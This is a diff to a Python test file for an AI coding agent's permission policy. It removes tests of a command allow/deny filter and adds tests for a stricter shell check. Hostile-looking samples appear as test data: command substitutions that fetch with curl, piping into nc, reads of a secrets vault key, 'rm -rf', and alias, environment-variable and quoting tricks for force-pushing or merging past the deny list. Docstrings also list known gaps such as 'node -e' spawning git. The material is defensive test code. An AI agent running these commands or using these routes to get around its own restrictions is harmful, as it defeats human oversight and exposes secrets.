@@ -16,7 +16,7 @@ from dataclasses import replace
 from pathlib import Path
 
 from coscc.agent import policy
-from coscc.agent.policy import READ_TOOLS, Grant, check_command, grant_for, grant_for_step
+from coscc.agent.policy import READ_TOOLS, Grant, grant_for, grant_for_step
 
 IMPL = grant_for("impl")
 
@@ -24,13 +24,6 @@ IMPL = grant_for("impl")
 def says(grant, tool, tool_input, roots=("/tmp/ws",), agent_id=None, **places) -> str:
     """What `critical` says of one call, the session's places being `roots` and `places`."""
     return policy.critical(grant, policy.Places(roots=roots, **places), tool, tool_input, agent_id)
-
-
-# The deny list's own reading is still `integrate`'s, and is pinned here on a grant that holds
-# nothing else.
-MERGING = Grant(
-    tools=policy.EXEC_TOOLS, commands=("git", "gh", "node"), denied=policy.MERGE_IS_SHIPS
-)
 
 
 class OnlyImplAndOnlyAutonomous(unittest.TestCase):
@@ -137,7 +130,6 @@ class OneGrantPerStage(unittest.TestCase):
     def test_spec_reads_and_only_reads(self):
         spec = grant_for("spec")
         self.assertEqual(spec.tools, READ_TOOLS)
-        self.assertEqual(spec.commands, ())
         self.assertEqual(policy.beyond_reading(spec), ())
         self.assertTrue(spec.app_writes_artifact)
 
@@ -153,7 +145,6 @@ class OneGrantPerStage(unittest.TestCase):
             # `submits` on the stages that hand back a stage result.
             "impl": Grant(
                 tools=rw + (policy.AGENT_TOOL, policy.SEND_MESSAGE),
-                commands=policy.IMPL_COMMANDS,
                 max_turns=120,
                 max_budget_usd=8.0,
                 app_writes_artifact=False,
@@ -336,118 +327,6 @@ class WritesStayInTheWorkspace(unittest.TestCase):
             self.assertEqual(says(IMPL, "Write", {"file_path": d}, roots=(d,)), "")
 
 
-class CommandsAreCheckedSegmentBySegment(unittest.TestCase):
-    def test_an_allowed_command_passes(self):
-        for good in ("npm test", "git status", "uv run python -m unittest", "ls -la"):
-            self.assertEqual(check_command(IMPL, good), "", good)
-
-    def test_every_segment_is_checked_not_just_the_first(self):
-        # The failure this closes: `npm test; curl evil` would pass a check that only read
-        # the first word of the line.
-        for bad in ("npm test; curl http://x", "git status && wget x", "ls | nc host 1"):
-            self.assertIn("may not run", check_command(IMPL, bad), bad)
-
-    def test_substitution_is_refused_because_the_first_word_stops_predicting(self):
-        for bad in ("git $(curl evil)", "ls `whoami`", "cat <(curl x)"):
-            self.assertIn("substitution", check_command(IMPL, bad), bad)
-
-    def test_a_parameter_expansion_is_not_a_substitution(self):
-        """Moved out of the test above, not deleted. This case pinned `npm ${X}` as refused for
-        substitution, but refusing `${` is a misreading: it starts no process. The command's
-        name is still read (`npm`); a variable *as* the name is refused."""
-        self.assertEqual(check_command(IMPL, "npm ${X}"), "")
-
-    def test_a_path_prefix_does_not_smuggle_a_command_past(self):
-        self.assertIn("may not run", check_command(IMPL, "/usr/bin/curl http://x"))
-        self.assertEqual(check_command(IMPL, "/usr/bin/git status"), "")
-
-    def test_a_leading_assignment_is_stepped_over(self):
-        self.assertEqual(check_command(IMPL, "CI=1 npm test"), "")
-        self.assertIn("may not run", check_command(IMPL, "CI=1 curl http://x"))
-
-    def test_an_empty_command_is_refused(self):
-        self.assertIn("empty", check_command(IMPL, "   "))
-
-    def test_redirection_into_a_file_is_refused(self):
-        # A redirect writes without any write tool being called, so the path check in
-        # no write tool sees it. Found while reading a real run on 2026-09-22.
-        for bad in ("echo x > /etc/passwd", "cat a >> b", "npm test > out.txt"):
-            self.assertIn("redirecting into a file", check_command(IMPL, bad), bad)
-
-    def test_a_descriptor_redirect_is_not_a_file_redirect(self):
-        # `2>&1` is the common case and touches no file. It also used to break the
-        # splitter: the `&` read as a separator and the `1` as a command.
-        for good in ("npm test 2>&1", "ls >&2", "uv run python -m unittest 2>&1 | tail -5"):
-            self.assertEqual(check_command(IMPL, good), "", good)
-
-
-class MergingIsShipsNotPrs(unittest.TestCase):
-    """A session never merges; `ship` does, after a review passed. `ship` is the PR machine's
-    alone, and the deny list is read on `MERGING`."""
-
-    PR = MERGING
-
-    def test_pr_is_refused_the_merge_and_told_whose_it_is(self):
-        for line in (
-            "gh pr merge --squash --delete-branch",
-            "gh pr merge 7",
-            "git push -u origin HEAD && gh pr merge --squash",
-            "/usr/bin/gh pr merge",
-        ):
-            reason = check_command(self.PR, line)
-            self.assertIn("merging is the ship stage's", reason, line)
-
-    def test_pr_may_still_open_and_watch_the_pull_request(self):
-        for line in ("gh pr create --fill", "gh pr checks 7 --watch", "gh pr view 7"):
-            self.assertEqual(check_command(self.PR, line), "", line)
-
-    def test_ship_is_no_prose_stage_and_no_session(self):
-        """Was `test_ship_is_no_longer_a_prose_stage`. `ship` holds no grant at all, so the
-        second half says it carries nothing."""
-        self.assertNotIn("ship", policy.PROSE_STAGES)
-        self.assertEqual(grant_for("ship").commands, ())
-
-    def test_review_reads_and_only_reads(self):
-        review = grant_for("review")
-        self.assertEqual(review.tools, policy.READ_TOOLS)
-        self.assertEqual(policy.beyond_reading(review), ())
-        self.assertIn("review", policy.PROSE_STAGES)
-
-    def test_a_flag_in_front_does_not_walk_past_the_deny_list(self):
-        """Flags are removed before the prefix is compared."""
-        for line in (
-            "gh -R o/r pr merge 7",
-            "gh --repo o/r pr merge 7",
-            "gh --repo=o/r pr merge 7",
-            "gh pr -R o/r merge 7",
-            "gh --hostname github.com pr merge 7",
-            "gh api -X PUT repos/o/r/pulls/7/merge",
-            "gh alias set m 'pr merge'",
-        ):
-            self.assertIn("merging is the ship stage's", check_command(self.PR, line), line)
-        # A value flag's value is not read as a word, but a real word after it still is.
-        self.assertEqual(check_command(self.PR, "gh -R o/r pr view 7"), "")
-        self.assertEqual(check_command(self.PR, "gh api repos/o/r/pulls/7"), "")
-
-    def test_the_known_limit_of_the_deny_list(self):
-        """`node -e` may spawn `gh`, and an alias defined before the step runs under its own name.
-        Pinned so that nobody reads this grant as a guarantee; `.claude/CLAUDE.md` says the same."""
-        self.assertEqual(check_command(self.PR, "node -e 'require(\"child_process\")'"), "")
-        self.assertEqual(check_command(self.PR, "gh m 7"), "")
-
-
-class TheKnownLimit(unittest.TestCase):
-    def test_an_allowed_binary_can_still_be_told_to_do_a_lot(self):
-        """`plan.md` Risk 3, written down as a passing test rather than left implied.
-
-        `git` is on the list because a step has to be able to check its own work. Nothing
-        here stops it being handed arguments that reach further than that. The bound is
-        `cwd`, the write check above, and the turn and budget ceilings — not this list.
-        """
-        self.assertEqual(check_command(IMPL, "git push --force"), "")
-        self.assertEqual(check_command(IMPL, "npm install something"), "")
-
-
 class TheEstimateGrantOpensNothing(unittest.TestCase):
     """$2.00, no tool, no command, and a warning for the page."""
 
@@ -569,152 +448,6 @@ class ThePlanCeilingClearsTheOneItHit(unittest.TestCase):
     def test_plan_still_only_reads(self):
         # Raising the ceiling must not widen what the stage may do.
         self.assertEqual(grant_for("plan").tools, READ_TOOLS)
-        self.assertEqual(grant_for("plan").commands, ())
-
-
-class GeboPushesOnlyWithTheLease(unittest.TestCase):
-    """One push, leased to the head the step began at, on the unit's branch."""
-
-    G = grant_for("integrate")
-    BRANCH = "feat/x"
-    HEAD = "a" * 40
-    LEASE = (BRANCH, HEAD)
-    OK = f"git push --force-with-lease=feat/x:{'a' * 40} origin feat/x"
-
-    def run_(self, command, lease=LEASE):
-        return check_command(self.G, command, lease)
-
-    def test_the_ceilings_are_impls_chosen_not_measured(self):
-        self.assertEqual((self.G.max_turns, self.G.max_budget_usd), (120, 8.0))
-        self.assertTrue(self.G.push_needs_lease)
-        self.assertFalse(self.G.app_writes_artifact)
-        self.assertEqual(self.G.warning, policy.INTEGRATE_WARNING)
-        self.assertIn("gh", self.G.commands)
-
-    def test_the_one_allowed_push(self):
-        self.assertEqual(self.run_(self.OK), "")
-        self.assertEqual(
-            self.run_(f"git push --force-with-lease=feat/x:{self.HEAD} origin HEAD:feat/x"), ""
-        )
-        self.assertEqual(
-            self.run_(f"git push -u --force-with-lease=feat/x:{self.HEAD} origin feat/x"), ""
-        )
-
-    def test_every_other_push_is_refused_with_its_own_reason(self):
-        cases = {
-            "git push origin feat/x": "exactly one",
-            "git push --force origin feat/x": "--force",
-            "git push -f origin feat/x": "--force",
-            "git push --force-with-lease origin feat/x": "needs a value",
-            f"git push --force-with-lease=feat/x:{'b' * 40} origin feat/x": "bound to",
-            f"git push --force-with-lease=feat/x:{'a' * 7} origin feat/x": "bound to",
-            f"git push --force-with-lease=feat/x:{self.HEAD} origin main": "push with",
-            f"git push --force-with-lease=feat/x:{self.HEAD} origin feat/x:main": "push with",
-            f"git push --force-with-lease=feat/x:{self.HEAD} --all origin": "--all",
-            f"git push --force-with-lease=feat/x:{self.HEAD} --mirror origin": "--mirror",
-            f"git push --force-with-lease=feat/x:{self.HEAD} --tags origin feat/x": "--tags",
-            f"git push --force-with-lease=feat/x:{self.HEAD} --delete origin feat/x": "--delete",
-            f"git -C . push --force-with-lease=feat/x:{self.HEAD} origin feat/x": "nothing between",
-        }
-        for command, why in cases.items():
-            with self.subTest(command=command):
-                reason = self.run_(command)
-                self.assertIn(why, reason)
-
-    def test_a_push_in_anothers_arguments_is_not_a_push(self):
-        """`push` as a word, not as the subcommand."""
-        for command in ("git log --grep push", "git commit -m push", "git branch push-fix"):
-            with self.subTest(command=command):
-                self.assertEqual(self.run_(command), "")
-        for command in ("git --no-pager push origin feat/x", "git -c a=b push origin feat/x"):
-            with self.subTest(command=command):
-                self.assertIn("nothing between", self.run_(command))
-
-    def test_no_lease_means_no_push(self):
-        self.assertIn("no lease", self.run_(self.OK, lease=None))
-
-    def test_merge_pull_and_update_branch_are_refused(self):
-        for command in (
-            "git merge origin/main",
-            "git pull --rebase origin main",
-            "gh pr merge 7",
-            "gh -R o/r pr update-branch 7 --rebase",
-            "gh api -X PUT repos/o/r/pulls/7/merge",
-        ):
-            with self.subTest(command=command):
-                self.assertNotEqual(self.run_(command), "")
-
-    def test_rebase_and_tests_run(self):
-        for command in (
-            "git rebase origin/main",
-            "git rebase --continue",
-            "git rebase --abort",
-            "npm test",
-            "uv run python -m unittest",
-            "gh pr checks 7",
-        ):
-            with self.subTest(command=command):
-                self.assertEqual(self.run_(command), "")
-
-    def test_roads_past_the_lease_that_the_grant_holds_are_refused(self):
-        """Moving the branch without saying `git push`."""
-        cases = {
-            "gh api -X PATCH repos/o/r/git/refs/heads/feat/x -f sha=abc -F force=true": "no lease",
-            "gh -R o/r api graphql -f query=x": "no lease",
-            "gh repo sync o/r --branch feat/x --force": "no lease",
-            "gh extension install o/gh-x": "extension",
-            "git send-pack origin +HEAD:refs/heads/feat/x": "without the lease",
-            "git http-push origin feat/x": "without the lease",
-            "git -c alias.p=push p --force origin feat/x": "alias",
-            "git -c Alias.p=push p --force origin feat/x": "alias",
-            "git config alias.p push": "alias",
-            "git config --global alias.p push": "alias",
-            "git -c include.path=x p": "alias",
-            "git --config-env=alias.p=V p": "alias",
-            "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push git p": "alias",
-        }
-        for command, why in cases.items():
-            with self.subTest(command=command):
-                self.assertIn(why, self.run_(command))
-
-    def test_reading_the_pull_request_stays_open(self):
-        for command in (
-            "gh pr view 7 --json headRefOid",
-            "gh pr checks 7",
-            "git config user.name",
-            "GIT_EDITOR=true git rebase --continue",
-        ):
-            with self.subTest(command=command):
-                self.assertEqual(self.run_(command), "")
-
-    def test_the_known_limit(self):
-        """Tokens, not what runs. A program the grant may start can spawn `git push --force` itself
-        — `node -e`, `python -c`, or a script the step wrote and then ran through `npm test`."""
-        for command in (
-            "node -e 'require(\"child_process\")'",
-            "python -c 'import subprocess'",
-            "python3 push.py",
-            "npm test",
-        ):
-            with self.subTest(command=command):
-                self.assertEqual(self.run_(command), "")
-
-    def test_the_new_refusals_are_geboes_alone(self):
-        self.assertEqual(check_command(MERGING, "gh api repos/o/r/pulls/7"), "")
-        self.assertEqual(check_command(grant_for("impl"), "git config alias.st status"), "")
-
-    def test_other_grants_push_as_before(self):
-        self.assertEqual(check_command(MERGING, "git push origin feat/x"), "")
-        self.assertEqual(check_command(IMPL, "git push origin feat/x"), "")
-
-
-class IntegrateKeepsItsDenyList(unittest.TestCase):
-    """`integrate` keeps its own deny list. `pr` holds no grant, so the rebase, pull and
-    forced-push refusals it carried are gone with it."""
-
-    def test_integrate_is_unchanged(self):
-        self.assertIs(grant_for("integrate").denied, policy.INTEGRATE_DENIED)
-        self.assertIn("ship stage's", check_command(grant_for("integrate"), "gh pr merge 7"))
 
 
 class IntentReadsWhatSpecReads(unittest.TestCase):
@@ -724,7 +457,6 @@ class IntentReadsWhatSpecReads(unittest.TestCase):
     def test_it_holds_the_read_tools_and_nothing_beyond_reading(self):
         grant = grant_for("intent")
         self.assertEqual(grant.tools, READ_TOOLS)
-        self.assertEqual(grant.commands, ())
         self.assertEqual(policy.beyond_reading(grant), ())
 
     def test_its_ceilings_are_specs(self):
@@ -762,14 +494,6 @@ class SpikeWritesOnlyItsScratch(unittest.TestCase):
         self.assertIn("arbitrary code", self.G.warning)
         self.assertNotIn("spike", policy.PROSE_STAGES)
 
-    def test_git_is_not_among_its_commands(self):
-        # `beyond_reading` does not guard this grant, so this line does.
-        self.assertNotIn("git", self.G.commands)
-        self.assertIn(
-            "this step may not run 'git'", check_command(self.G, "git -C /tmp commit -m x")
-        )
-        self.assertEqual(check_command(self.G, "python -c 'print(1)'"), "")
-
     def test_it_reads_the_worktree_and_the_unit(self):
         self.assertEqual(self.d("Read", self.tree / "coscc" / "policy.py"), "")
         self.assertEqual(self.d("Read", self.unit / "spec.md"), "")
@@ -778,130 +502,6 @@ class SpikeWritesOnlyItsScratch(unittest.TestCase):
         self.assertEqual(self.d("Write", self.scratch / "probe.py"), "")
         self.assertIn(policy.WRITES, self.d("Write", self.tree / "probe.py"))
         self.assertIn(policy.WRITES, self.d("Write", self.unit / "spec.md"))
-
-
-class TheShellIsReadAsTheShellReadsIt(unittest.TestCase):
-    """On this set, the refusals naming a command that is not one, and the refusals of `${…}` or a
-    backtick in single quotes, are zero."""
-
-    # Each must pass under `impl`.
-    PASS = (
-        "grep -E 'a|b' f",
-        'rg "def |class " coscc',
-        'git commit -m "fix: a; b && c"',
-        'git commit -m "first line\n\nsecond; line | with && ops"',
-        "ls # a; curl x",
-        "cat <<'EOF'\nfail) ^ | def\nEOF",
-        'echo "${PIPESTATUS[0]}"',
-        "echo ${PIPESTATUS[0]}",
-        "npm ${X}",
-        "grep '\\`x\\`' f",
-        "cat <<'EOF'\nrun `whoami` and $(date)\nEOF",
-        "npm test > /dev/null 2>&1",
-        "npm test 2>/dev/null",
-        "npm test &>/dev/null",
-    )
-
-    # Each refused, the reason carrying the fragment named.
-    REFUSE = (
-        ("git $(curl evil)", "substitution"),
-        ("ls `whoami`", "substitution"),
-        ("cat <(curl x)", "substitution"),
-        ('echo "$(curl x)"', "substitution"),
-        ("cat <<EOF\n$(curl x)\nEOF", "substitution"),
-        ("echo ${X:-$(curl x)}", "substitution"),
-        ("$CMD x", "variable"),
-        ("echo x > out.txt", "redirect"),
-        ("echo x > /tmp/other/x", "redirect"),
-        ("echo x > /tmp/coscc-0060_x/../ws/f", "redirect"),
-        ("cat a >> b", "redirect"),
-        ("echo x &>file", "redirect"),
-        ("cat <>file", "redirect"),
-        ("echo x > /dev/null/..", "redirect"),
-        ("echo x > $OUT", "redirect"),
-        ("echo x >&out.txt", "redirect"),
-    )
-
-    UNREADABLE = (
-        "echo 'unclosed",
-        "cat <<EOF\nno end line",
-        "echo $(date",
-        'echo "unclosed',
-        "echo ${X",
-        "echo x >",
-    )
-
-    def check(self, command):
-        return check_command(IMPL, command)
-
-    def test_every_sample_that_should_pass_passes(self):
-        for command in self.PASS:
-            with self.subTest(command=command):
-                self.assertEqual(self.check(command), "")
-
-    def test_the_two_counts_the_intent_names_are_zero(self):
-        reasons = [self.check(command) for command in self.PASS]
-        self.assertEqual(sum("may not run" in r for r in reasons), 0)
-        self.assertEqual(sum("substitution" in r for r in reasons), 0)
-
-    def test_every_sample_that_should_be_refused_is_refused_for_its_own_reason(self):
-        for command, why in self.REFUSE:
-            with self.subTest(command=command):
-                self.assertIn(why, self.check(command))
-
-    def test_a_line_that_cannot_be_read_is_refused_not_guessed(self):
-        for command in self.UNREADABLE:
-            with self.subTest(command=command):
-                self.assertIn("could not be read", self.check(command))
-
-    def test_the_name_refused_is_the_real_first_word(self):
-        """`this step may not run X`, X the command's first word with quotes removed."""
-        self.assertEqual(self.check("npm test; 'curl' x"), "this step may not run 'curl'")
-        self.assertEqual(self.check("npm test | sed -e 's/a|b/c/'"), "this step may not run 'sed'")
-        self.assertEqual(self.check('X="a b" curl x'), "this step may not run 'curl'")
-
-    def test_an_assignment_alone_is_refused_by_what_it_is(self):
-        """Measured on the refusals of 2026-09-23..24: `S=/home/…/coscc-fb0599d12eeb; node …`
-        must not be refused as `may not run 'coscc-fb0599d12eeb'`, a name taken from the
-        value's last `/`."""
-        reason = self.check("S=/home/bd/.cos/units/coscc-fb0599d12eeb; node x $S")
-        self.assertIn("only assigns (S=", reason)
-        self.assertNotIn("may not run", reason)
-
-    def test_arithmetic_is_refused_and_named_as_such(self):
-        reason = self.check("echo $((1+1))")
-        self.assertIn("arithmetic substitution is not allowed: $((", reason)
-        self.assertNotIn("$( ", reason)
-
-    def test_a_backslashed_dollar_or_backtick_is_text(self):
-        for command in ("echo \\$(x)", "echo \\`x\\`", 'echo "\\$(x)"', "echo $'`x` $(y)'"):
-            with self.subTest(command=command):
-                self.assertEqual(self.check(command), "")
-
-    def test_a_variable_as_the_name_is_refused(self):
-        for command in ("$CMD x", "${CMD} x", 'X=1 "$CMD" x', "/usr/bin/$C x"):
-            with self.subTest(command=command):
-                self.assertIn("name is a variable", self.check(command))
-
-    def test_a_variable_passed_to_git_or_gh_is_refused_where_words_are_denied(self):
-        pr, integrate = MERGING, grant_for("integrate")
-        self.assertIn("may not pass ${P} to gh", check_command(pr, "gh ${P} merge"))
-        self.assertIn("may not pass $P to gh", check_command(pr, "gh $P merge"))
-        self.assertIn("may not pass $SUB to git", check_command(integrate, "git $SUB --force"))
-        # `impl` denies nothing, so it keeps what it had.
-        self.assertEqual(check_command(IMPL, 'git commit -m "$MSG"'), "")
-
-    def test_quotes_no_longer_hide_a_refused_word(self):
-        """Read after quote removal: bash runs `gh pr merge` for all of these."""
-        pr = MERGING
-        for command in ("gh pr 'merge' 7", 'gh "pr" merge', "gh pr m\\erge", "gh pr $'merge'"):
-            with self.subTest(command=command):
-                self.assertIn("ship stage's", check_command(pr, command))
-        self.assertIn("alias", check_command(grant_for("integrate"), "git -c al\\ias.p=push p"))
-
-    def test_a_separator_inside_a_heredoc_body_starts_no_command(self):
-        self.assertEqual(self.check("cat <<EOF\nx; curl y\nEOF\nls"), "")
-        self.assertIn("may not run 'curl'", self.check("cat <<EOF\nx\nEOF\ncurl y"))
 
 
 class TheReaderFollowsBash(unittest.TestCase):
@@ -1022,7 +622,6 @@ class TheLabelDecidesImplsCeilings(unittest.TestCase):
         )
         written = Grant(
             tools=rw,
-            commands=policy.IMPL_COMMANDS,
             max_turns=120,
             max_budget_usd=8.0,
             app_writes_artifact=False,
@@ -1228,86 +827,6 @@ class AHelperRunsGitOnlyToRead(unittest.TestCase):
 
     def test_the_leading_sessions_commit_runs(self):
         self.assertEqual(self.bash("git commit -m x", None), "")
-
-
-class TheSecretsAreOutOfEveryCommandsReach(unittest.TestCase):
-    """K1 of 0069: a word pointing into the vault's store or `~/.config/coscc/` is refused at
-    every stage, whatever the grant's commands."""
-
-    PROTECTED = policy.protected_paths("/srv/cos", "/home/u/.config", "/home/u")
-
-    def test_both_paths_are_refused_at_every_stage_that_runs_commands(self):
-        lines = (
-            "cat /srv/cos/vault/a.age",
-            "ls /srv/cos/vault",
-            "cat ~/.config/coscc/vault.key",
-            "cat $HOME/.config/coscc/env",
-            "grep -r x /home/u/.config/coscc",
-            "git log --output=/srv/cos/vault/x",
-            "cat < /srv/cos/./vault/a.age",
-        )
-        for stage in (*policy.GRANTS, "impl"):
-            grant = replace(grant_for(stage), commands=("cat", "ls", "grep", "git"))
-            grant = replace(grant, protected=self.PROTECTED)
-            for line in lines:
-                with self.subTest(stage=stage, line=line):
-                    self.assertIn("the app's secrets", check_command(grant, line))
-
-    def test_a_glob_that_could_expand_into_one_is_refused(self):
-        grant = replace(IMPL, protected=self.PROTECTED, commands=("cat", "ls"))
-        for line in (
-            "cat ~/.config/cos*/vault.key",
-            "cat $HOME/.config/coscc/vault.k?y",
-            "ls /srv/*/vault",
-            "ls /srv/cos/[v]ault/",
-            "cat --file=/home/u/.config/c*",
-        ):
-            with self.subTest(line=line):
-                self.assertIn("the app's secrets", check_command(grant, line))
-
-    def test_a_glob_that_stops_short_of_one_is_not_refused(self):
-        grant = replace(IMPL, protected=self.PROTECTED, commands=("cat", "ls"))
-        for line in ("ls /srv/*", "ls *.py", "ls /home/u/.config/x*", "cat /srv/cos/v*s/a"):
-            with self.subTest(line=line):
-                self.assertEqual(check_command(grant, line), "")
-
-    def test_a_neighbour_of_a_protected_path_is_not_refused(self):
-        grant = replace(IMPL, protected=self.PROTECTED)
-        for line in ("ls /srv/cos/vaults", "cat /home/u/.config/cosccx/a", "ls /srv/cos"):
-            with self.subTest(line=line):
-                self.assertEqual(check_command(grant, line), "")
-
-    def test_allow_does_not_widen_it(self):
-        grant = policy.with_lists(replace(IMPL, protected=self.PROTECTED), ("curl",), ())
-        self.assertIn("the app's secrets", check_command(grant, "curl file:///srv/cos/vault/a"))
-
-
-class AWorkspacesListsChangeOnlyImplsCommands(unittest.TestCase):
-    """K2 of 0069: `allow` adds, `block` takes out and wins; nothing else of the grant moves."""
-
-    def test_allow_adds_and_block_wins(self):
-        grant = policy.with_lists(IMPL, ("curl", "psql", "git"), ("psql", "rm", "npm"))
-        self.assertIn("curl", grant.commands)
-        self.assertNotIn("psql", grant.commands)
-        self.assertNotIn("npm", grant.commands)
-        self.assertEqual(grant.commands.count("git"), 1)
-        self.assertEqual(replace(grant, commands=IMPL.commands), IMPL)
-
-    def test_empty_lists_keep_impls_commands(self):
-        self.assertEqual(policy.with_lists(IMPL, (), ()), IMPL)
-
-    def test_programs_are_read_as_check_command_reads_them(self):
-        self.assertEqual(
-            policy.programs_of("A=1 /usr/bin/psql -c 'x; y' | grep z && echo ok"),
-            ("psql", "grep", "echo"),
-        )
-        self.assertEqual(policy.programs_of("echo 'unclosed"), ())
-
-    def test_the_pref_is_read_per_workspace_and_a_path_is_no_name(self):
-        stored = {"/w": {"allow": ["curl", "/usr/bin/nc", "x" * 65, 3], "block": ["rm"]}}
-        self.assertEqual(policy.lists_of(stored, "/w"), (("curl",), ("rm",)))
-        self.assertEqual(policy.lists_of(stored, "/other"), ((), ()))
-        self.assertEqual(policy.lists_of("junk", "/w"), ((), ()))
 
 
 class _Unit(unittest.TestCase):
@@ -2050,3 +1569,119 @@ class WhatGoesToTheClassifier(_Unit):
         ):
             with self.subTest(tool=tool, tool_input=tool_input):
                 self.assertTrue(policy.classified(IMPL, self.places, tool, tool_input))
+
+
+class NoCommandListIsLeft(unittest.TestCase):
+    def test_policy_holds_no_command_filter(self):
+        for name in (
+            "IMPL_COMMANDS",
+            "SPIKE_COMMANDS",
+            "INTEGRATE_COMMANDS",
+            "INTEGRATE_DENIED",
+            "MERGE_IS_SHIPS",
+            "check_command",
+            "lists_of",
+            "with_lists",
+            "GRANTS_PREF",
+            "LISTED_STAGE",
+            "COMMAND_NAME",
+        ):
+            with self.subTest(name=name):
+                self.assertFalse(hasattr(policy, name))
+
+    def test_a_grant_carries_no_command_field(self):
+        fields = set(Grant.__dataclass_fields__)
+        self.assertFalse(fields & {"commands", "denied", "push_needs_lease", "protected"})
+        self.assertFalse(Grant().opens_anything)
+        self.assertTrue(Grant(tools=("Read",)).opens_anything)
+
+
+class TheStrictCheckRefusesAnySubstitution(_Unit):
+    """`strict` is the vault's: its line runs with secrets in it, so what the line spells must be
+    what runs."""
+
+    def strict(self, line: str) -> str:
+        return policy.bash_refused(self.places, line, strict=True)
+
+    def test_every_substitution_is_refused(self):
+        for line in ("echo $(date)", "echo `date`", "diff <(ls) a", "tee >(cat)", "echo $((1+2))"):
+            with self.subTest(line=line):
+                self.assertIn("substitution", self.strict(line))
+
+    def test_an_unreadable_line_is_refused(self):
+        self.assertIn("could not be read", self.strict("echo 'open"))
+
+    def test_a_plain_line_runs(self):
+        for line in ("curl -s https://example.com", "make test", "echo $HOME | wc -c"):
+            with self.subTest(line=line):
+                self.assertEqual(self.strict(line), "")
+
+    def test_the_critical_roads_still_hold(self):
+        store, key = self.secrets[0], f"{self.home}/.config/coscc/vault.key"
+        for line in (
+            f"cat {store}/ws/x.age",
+            f"base64 {key}",
+            "git push origin main",
+            "gh pr merge 7",
+            "rm -rf /etc/x",
+            "echo hi &",
+        ):
+            with self.subTest(line=line):
+                self.assertNotEqual(self.strict(line), "", line)
+
+
+class GeboHoldsTheCeilingsAndTheWarning(unittest.TestCase):
+    """The lease and the merge refusals are `critical`'s (`OnlyTheUnitsBranchIsPushed`); the grant
+    holds only what the page shows and the ceilings."""
+
+    def test_the_grant(self):
+        g = grant_for("integrate")
+        self.assertEqual((g.max_turns, g.max_budget_usd), (120, 8.0))
+        self.assertFalse(g.app_writes_artifact)
+        self.assertEqual(g.warning, policy.INTEGRATE_WARNING)
+        self.assertEqual(g.tools, READ_TOOLS + policy.WRITE_TOOLS + policy.EXEC_TOOLS)
+
+    def test_a_merge_is_refused_for_every_session(self):
+        for stage in ("impl", "integrate", "spike"):
+            self.assertNotEqual(says(grant_for(stage), "Bash", {"command": "gh pr merge 7"}), "")
+
+
+class TheShellIsReadAsTheShellReadsIt(_Unit):
+    """What a person's own commands spell is not refused by a reader that misreads quotes,
+    heredocs or `${...}`."""
+
+    PASS = (
+        "grep -E 'a|b' f",
+        'rg "def |class " coscc',
+        'git commit -m "fix: a; b && c"',
+        'git commit -m "first line\n\nsecond; line | with && ops"',
+        "ls # a; curl x",
+        "cat <<'EOF'\nfail) ^ | def\nEOF",
+        'echo "${PIPESTATUS[0]}"',
+        "echo ${PIPESTATUS[0]}",
+        "npm ${X}",
+        "grep '\\`x\\`' f",
+        "cat <<'EOF'\nrun `whoami` and $(date)\nEOF",
+        "npm test > /dev/null 2>&1",
+        "npm test &>/dev/null",
+        "echo x > out.txt",
+        "curl -s https://example.com | jq .",
+    )
+    UNREADABLE = (
+        "echo 'unclosed",
+        "cat <<EOF\nno end line",
+        "echo $(date",
+        'echo "unclosed',
+        "echo ${X",
+        "echo x >",
+    )
+
+    def test_every_sample_that_should_pass_passes(self):
+        for command in self.PASS:
+            with self.subTest(command=command):
+                self.assertEqual(self.bash(command), "")
+
+    def test_a_line_that_cannot_be_read_is_refused_not_guessed(self):
+        for command in self.UNREADABLE:
+            with self.subTest(command=command):
+                self.assertIn("could not be read", self.bash(command))
